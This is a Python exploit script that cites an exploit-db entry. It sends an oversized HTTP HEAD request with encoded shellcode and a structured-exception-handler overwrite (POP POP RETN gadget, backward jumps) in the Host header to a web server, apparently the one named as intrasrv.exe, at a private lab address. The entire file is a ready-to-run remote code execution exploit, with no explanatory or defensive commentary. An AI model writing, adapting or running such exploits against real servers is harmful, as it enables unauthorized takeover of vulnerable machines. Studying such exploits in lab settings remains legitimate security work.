#!/usr/bin/python
# https://www.exploit-db.com/exploits/25836

import socket
from struct import *

IP = "192.168.132.132"
PORT = 80

shellcode =  ""
shellcode += "\xba\x97\x92\x8c\xa9\xda\xd2\xd9\x74\x24"
shellcode += "\xf4\x5f\x2b\xc9\xb1\x31\x31\x57\x13\x83"
shellcode += "\xc7\x04\x03\x57\x98\x70\x79\x55\x4e\xf6"
shellcode += "\x82\xa6\x8e\x97\x0b\x43\xbf\x97\x68\x07"
shellcode += "\xef\x27\xfa\x45\x03\xc3\xae\x7d\x90\xa1"
shellcode += "\x66\x71\x11\x0f\x51\xbc\xa2\x3c\xa1\xdf"
shellcode += "\x20\x3f\xf6\x3f\x19\xf0\x0b\x41\x5e\xed"
shellcode += "\xe6\x13\x37\x79\x54\x84\x3c\x37\x65\x2f"
shellcode += "\x0e\xd9\xed\xcc\xc6\xd8\xdc\x42\x5d\x83"
shellcode += "\xfe\x65\xb2\xbf\xb6\x7d\xd7\xfa\x01\xf5"
shellcode += "\x23\x70\x90\xdf\x7a\x79\x3f\x1e\xb3\x88"
shellcode += "\x41\x66\x73\x73\x34\x9e\x80\x0e\x4f\x65"
shellcode += "\xfb\xd4\xda\x7e\x5b\x9e\x7d\x5b\x5a\x73"
shellcode += "\x1b\x28\x50\x38\x6f\x76\x74\xbf\xbc\x0c"
shellcode += "\x80\x34\x43\xc3\x01\x0e\x60\xc7\x4a\xd4"
shellcode += "\x09\x5e\x36\xbb\x36\x80\x99\x64\x93\xca"
shellcode += "\x37\x70\xae\x90\x5d\x87\x3c\xaf\x13\x87"
shellcode += "\x3e\xb0\x03\xe0\x0f\x3b\xcc\x77\x90\xee"
shellcode += "\xa9\x98\x72\x3b\xc7\x30\x2b\xae\x6a\x5d"
shellcode += "\xcc\x04\xa8\x58\x4f\xad\x50\x9f\x4f\xc4"
shellcode += "\x55\xdb\xd7\x34\x27\x74\xb2\x3a\x94\x75"
shellcode += "\x97\x58\x7b\xe6\x7b\xb1\x1e\x8e\x1e\xcd"

junk = "A" * (1553 - len(shellcode) - 8) + shellcode
nseh = "\x90\x90\xEB\xF6"
seh = pack('<L', 0x004097dd) # POP POP RETN from intrasrv.exe
jmp450 = "\x90\x90\x90\xE9\x3E\xFE\xFF\xFF"
nop = "\x90" * 100

payload = junk + jmp450 + nseh + seh  + "D" * (4000 - len(junk) - len(jmp450) - len(nseh) - len(seh))

request  = "HEAD / HTTP/1.1\r\n"
request += "Host:" + payload + "\r\n"
request += "User-Agent: firefox \r\n"
request += "If-Modified-Since: Mon \r\n\r\n"

try:
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP, PORT))
	print("[*] Establishing a connection")
	s.send(request)
	print("[*] Sending the payload")
	s.close()
except:
	print("[!] Connection Failed")

